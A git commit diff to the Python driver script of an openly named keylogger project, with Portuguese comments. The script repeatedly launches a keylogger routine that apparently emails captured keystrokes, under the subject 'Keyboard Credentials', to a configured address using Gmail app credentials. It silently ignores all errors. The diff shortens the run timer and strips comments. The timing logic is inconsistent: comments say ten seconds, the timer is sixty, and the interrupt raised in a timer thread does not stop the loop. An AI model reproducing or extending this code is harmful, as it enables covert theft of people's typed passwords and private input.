ff59e6322ffdb589353446d9112fea25de60a43b
Jhean Phabio <127798956+jhonnunes443@users.noreply.github.com>
2024-05-13 20:54:12 -0300

    Update main.py

--- gadgets/main.py
+++ gadgets/main.py
@@ -5,31 +5,31 @@ def executar_arquivo(remetente_email, remetente_senha, destinatario_email, subje
     while True:
         try:
             print("#####Executando arquivos pendentes#####\n")
-            timer = Timer(1650, interromper_keylogger)  # Define um timer para interromper após 10 segundos
-            timer.start()  # Inicia o timer
+            timer = Timer(60, interromper_keylogger)  
+            timer.start()  
         except KeyboardInterrupt:
             print("Encerrando a execução do arquivo.")
         try:
             iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)
         except Exception:
-            pass  # Ignora todas as exceções
+            pass  
 
 def interromper_keylogger():
     try:
         print("#####Interrompendo a execução. #####")
-        raise KeyboardInterrupt  # Lança uma exceção KeyboardInterrupt para interromper a execução do keylogger
+        raise KeyboardInterrupt  
     except (Exception, KeyboardInterrupt):
         print("\n#####Encerrando todos os processos...#####\n")
 
 if __name__ == "__main__":
     remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
-    remetente_senha = "senha_de_token_para_app"  # Substitua pela sua senha de e-mail
-    destinatario_email = "Email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
+    remetente_senha = "sua_senha"  # Substitua pela sua senha de e-mail
+    destinatario_email = "email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
     subject = "Keyboard Credentials"
 
     print("Sendo executado agora...")
 
-    # Iniciar a execução do keylogger.py
     executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject)
 
     print("Encerrou após 10 segundos.")
+
